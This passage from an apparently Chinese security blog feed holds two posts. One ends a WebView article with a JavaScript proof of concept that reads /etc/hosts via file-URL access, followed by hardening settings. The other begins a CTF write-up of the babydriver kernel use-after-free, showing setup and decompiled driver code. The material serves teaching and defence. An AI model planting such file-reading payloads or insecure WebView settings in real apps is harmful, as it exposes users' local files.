punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置是否允许 WebView 使用 File 协议</span>        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAllowFileAccess</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置是否允许 WebView 使用 JavaScript</span>        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"file:///data/local/tmp/adbapp.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>编辑 dbapp.html 如下：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">loadXMLDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> arm <span class="token operator">=</span> <span class="token string">"file:///etc/hosts"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> xmlhttp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        xmlhttp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//alert("status is"+xmlhttp.status);</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>arm<span class="token punctuation">)</span><span class="token punctuation">;</span>    xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">loadXMLDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>运行程序，报错如下（has been blocked by CORS policy）：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2022</span>-06-03 07:41:28.568 <span class="token number">12969</span>-12969/com.bwshen.test I/chromium: <span class="token punctuation">[</span>INFO:CONSOLE<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token string">"Access to XMLHttpRequest at 'file:///etc/hosts' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, https."</span>, source: file:///data/local/tmp/dbapp.html <span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token number">2022</span>-06-03 07:41:28.568 <span class="token number">12969</span>-12969/com.bwshen.test I/chromium: <span class="token punctuation">[</span>INFO:CONSOLE<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token string">""</span>, source: file:///data/local/tmp/dbapp.html <span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span></code></pre><p>添加如下配置项：</p><pre class="language-bash" data-language="bash"><code class="language-bash">//设置是否允许通过 <span class="token function">file</span> url 加载的 Js 代码读取其他的本地文件webView.getSettings<span class="token punctuation">(</span><span class="token punctuation">)</span>.setAllowFileAccessFromFileURLs<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>重新运行程序，已成功加载本地 html 文件并读取 <code>/etc/hosts</code> 文件：<br><img src="https://img-blog.csdnimg.cn/19170e597015448f9c65da3fa0d720e6.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="通用协议风险"><a href="#通用协议风险" class="headerlink" title="通用协议风险"></a>通用协议风险</h2><p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接。</p><p>将 dbapp.html 文件改成访问 <a href="https://www.freebuf.com：">https://www.freebuf.com：</a><br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2c959444a1d94d54912a2b9a48d82add.png" alt="在这里插入图片描述" loading="lazy"><br>运行程序，效果如下图：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/402977b376224028a0d8d4f4d5e423a8.png" alt="在这里插入图片描述" loading="lazy"><br>如果不设置 setAllowUniversalAccessFromFileURLs 的值为 true，则无法正常加载 HTTPS 页面：<br><img src="https://img-blog.csdnimg.cn/8166c181eda54074b222bfe266a69b6c.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="漏洞防御策略"><a href="#漏洞防御策略" class="headerlink" title="漏洞防御策略"></a>漏洞防御策略</h2><ol><li>检查应用是否使用了 webview 控件；</li><li>避免 App 内部的 WebView 被不信任的第三方调用，排查内置 WebView 的 Activity 是否被导出、必须导出的 Activity 是否会通过参数传递调起内置的WebView等；</li><li>file 域访问为非功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li></ol><p>若需要开启 file 域访问，则设置 file 路径的白名单，严格控制 file 域的访问范围，具体如下：</p><ul><li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，<code>file:///android_asset</code> 和 <code>file:///android_res</code> 在不开启 API 的情况下也可以访问；</li><li>可能会更新的 HTML 文件放在 <code>/data/data/(app)</code> 目录下，避免被第三方替换或修改；</li><li>对 file 域请求做白名单限制时，需要对“<code>…/…/</code>”特殊情况进行处理，避免白名单被绕过。</li></ul><p><strong>最终解决方案总结：</strong></p><p>1）对于不需要使用 file 协议的应用，禁用 file 协议：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 禁用 file 协议；</span><span class="token function">setAllowFileAccess</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setAllowFileAccessFromFileURLs</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setAllowUniversalAccessFromFileURLs</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2）对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 需要使用 file 协议时</span><span class="token function">setAllowFileAccess</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 禁止 file 协议加载 JavaScript</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"file://"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文大体总结了 Android WebView 的历史高危漏洞及其当下的攻击面（接口非法访问），更多的攻击面可以参见——<a href="http://www.wiki.yelbee.top/2020/04/30/%E5%8D%93%E6%8A%A4%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/%E6%89%AB%E6%8F%8F%E5%8F%82%E6%95%B0%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E/3.6WebView%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/">WebView组件安全</a>。开发人员在使用 WebView 时应做好组件权限控制（尽量设置不可导出）、 URL 白名单校验、禁止危险协议等。</p><p>本文参考文章：</p><ol><li><a href="https://juejin.cn/post/6936814903021797389">深入浅出JSBridge：从原理到使用</a>；</li><li><a href="https://cloud.tencent.com/developer/article/1394361">Android：你要的WebView与JS交互方式都在这里了</a>；</li><li><a href="https://cloud.tencent.com/developer/article/1394368">Android：你不知道的 WebView 使用漏洞</a>；</li><li><a href="https://blog.csdn.net/u012195899/article/details/68942725">WebView远程代码执行漏洞学习并复现</a>；</li><li><a href="https://www.secpulse.com/archives/5525.html">Fiddler插件编写之WebView远程代码执行检测</a>；</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;WebView 是 Android 系统中的原生控件，它是一个基于 webkit 引擎、展现 web 页面的控件，相当于增强版的内置浏览器。</summary>
      
    
    
    
    <category term="终端安全" scheme="https://tr0e.github.io/categories/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Android内核层驱动程序UAF漏洞提权实例</title>
    <link href="https://tr0e.github.io/Android%E5%86%85%E6%A0%B8%E5%B1%82%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8FUAF%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E4%BE%8B/"/>
    <id>https://tr0e.github.io/Android%E5%86%85%E6%A0%B8%E5%B1%82%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8FUAF%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E4%BE%8B/</id>
    <published>2022-02-27T16:04:19.000Z</published>
    <updated>2022-06-15T16:13:18.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自 2021 年 11 月从国企离职并入职互联网私企后，发现博客很少更新了……自然不是因为开始躺平了（菜鸡的学习之路还很漫长…），而是新的平台充满挑战，需要学习的东西实在太多了（所以一直加班中…），加上很多内部学习材料和内容不可在公司外网传播，所以就很少写 CSDN 博文了。但是稍有时间还是要保持写博文习惯的hh，个人觉得这不仅是对个人技术成长路线的记录，也是一种促使自己不断保持学习状态的好习惯。</p><p>言归正传，换工作后开始从事移动终端安全的方向，最近在学习 Android 内核层和驱动的漏洞挖掘，刚好刷了一道关于内核提权的 CTF PWN 题目，颇有收益（太菜了…），在此学习记录下。</p><h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h1><blockquote><p>在计算机编程领域中，迷途指针（或称悬空指针、野指针），指的是不指向任何合法的对象的指针。当指针当所指向的对象被释放或者收回，但是对该指针没有作任何的修改，以至于该指针仍旧指向已经回收的内存地址，此情况下该指针便称迷途指针。若操作系统将这部分已经释放的内存重新分配给另外一个进程，而原来的程序重新引用现在的迷途指针并修改内存数据，则将产生无法预料的后果。</p></blockquote><p>UAF（Use After Free）漏洞，顾名思义，指的就是当一个内存块被释放之后其指针再次被使用，可能会导致意想不到的后果。分为以下三种情况：</p><ol><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃；</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转；</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li></ol><p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，一般称被释放后没有被设置为 NULL 的内存指针为悬空指针 dangling pointer。</p><p>下面通过一个简单的 C 语言程序来直观地感受下 UAF 漏洞：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>    p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//申请内存空间</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%x,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//释放 p1 指针所指向地内存空间</span>    <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>    p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存，即p2=p1</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"world"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//尝试对p1指针所指向的对内存空间进行修改</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%x,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//验证p2指针地址是否与p1相同，以及p1内存空间释放后是否能正常对p1指针进行读写</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>运行结果如图所示：<br><img src="https://img-blog.csdnimg.cn/070144a6324040fa90e685d342901474.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>可以看到，p1 与 p2 指针地址相同，p1 指针释放后，p2 申请相同的大小的内存时，操作系统会将之前给 p1 的地址分配给 p2，修改 p1 的内存空间，p2 也被修改了。</p><p><strong>UAF 漏洞的原理</strong></p><p>需要先介绍一下堆分配内存的原则，Linux 中进程分配内存的两种方式：brk 和 mmap。当程序使用 malloc 申请内存的时候，如果小于 256K，使用 brk 方式，将数据段 (.data) 的最高地址指针<code>_edata</code>往高地址推；如果大于 256，使用 mmap 方式，堆和栈之间找一块空闲内存分配。</p><p>应用程序调用 free() 函数来释放内存空间时，如果内存块小于 256kb， dlmalloc 并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当 dlmalloc 中空闲内存量达到一定值时 dlmalloc 才将空闲内存释放会内核。如果应用程序释放的内存大于 256kb，dlmalloc 马上调用 munmap() 释放内存（dlmalloc 不会缓存大于 256kb 的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源）。</p><p>所以 UAF 漏洞简单来说，就是程序第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><h1 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h1><p>下面通过一道 2017 年全国大学生信息安全竞赛的 PWN 题目 babydriver 来学习下内核层驱动程序 UAF 漏洞的提权利用。题目材料 Github 获取地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver">CISCN2017-babydriver</a>。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>来看下题目的三个附件：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/d59a93e263dc409b98d51226e7d0512b.png" alt="在这里插入图片描述" loading="lazy"><br>CTF 比赛中的内核题目通常也都由这几个部分组成：<br>| 文件        | 作用                                 |<br>| ———– | ———————————— |<br>| boot.sh     | qemu-system 脚本，用于启动内核虚拟机 |<br>| rootfs.cpio | 虚拟机的文件系统                     |<br>| bzImage     | 内核镜像                             |</p><p>1、开始分析题目，先来看下 qemu 虚拟机启动脚本的内容（可以看到指定了 rootfs.cpio 作为内核启动的文件系统，同时使用 bzImage 作为 kernel 映像）：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> -cpu kvm64,+smep</code></pre><p>需要先安装 qemu 环境（Ubuntu 虚拟机中直接执行命令 <code>sudo apt install qemu</code>即可安装），然后执行<code>./boot.sh</code> 即可启动 qemu 虚拟机：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/a777d5fe619c4f7ba05ddb00906861d1.png" alt="在这里插入图片描述" loading="lazy"><br>显然题目需要进行提权，才能获取 flag。执行 <code>cat init</code> 发现系统启动过程中加载了驱动文件<code>/lib/modules/4.4.72/babydriver.ko</code>，结合题目名称 babydriver 推断需要提取 babydriver.ko 驱动文件进行分析，借助其漏洞进行提权。</p><p>2、为了提取出 babydriver.ko 驱动程序，将题目提供的附件—— rootfs.cio 文件系统映像进行解包，写一个解包的脚本（或者手动逐条执行以下命令也可以）：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># sudo chmod a+x dec.sh</span><span class="token comment"># ./dec.sh</span><span class="token function">mkdir</span> fs<span class="token builtin class-name">cd</span> fs<span class="token function">cp</span> <span class="token punctuation">..</span>/rootfs.cpio ./rootfs.cpio.gzgunzip ./rootfs.cpio.gz cpio -idmv <span class="token operator">&lt;</span> rootfs.cpio<span class="token function">rm</span> rootfs.cpio</code></pre><p>解包后获取到的文件系统及 babydriver.ko 驱动程序如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/86b4edb886b14ccfb83ff2e07a0352c6.png" alt="在这里插入图片描述" loading="lazy"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>将 babydriver.ko 驱动程序文件拖入 IDA 64 进行逆向分析，发现 babyioctl、babayread、babyopen 等系统调用函数：<br><img src="https://img-blog.csdnimg.cn/e2d65c2fbc4b41d1a31234cb94d97911.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>核心函数反汇编后的伪代码可汇总如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//释放babydev_struct</span><span class="token keyword">int</span> __fastcall <span class="token function">babyrelease</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device release\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//申请一块大小为 0x40 字节的空间，地址存储在全局变量babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</span><span class="token keyword">int</span> __fastcall <span class="token function">babyopen</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>  babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">37748928LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//定义了 0x10001 的命令，可以释放全局变量 babydev_struct中的device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len</span>__int64 __fastcall <span class="token function">babyioctl</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> command<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> command <span class="token operator">==</span> <span class="token number">65537</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_kmalloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">37748928LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"alloc done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2EB<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//从 buffer 拷贝到全局变量中</span><span class="token class-name">ssize_t</span> __fastcall <span class="token function">babywrite</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//从全局变量拷贝到 buffer 中</span><span class="token class-name">ssize_t</span> __fastcall <span class="token function">babyread</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> 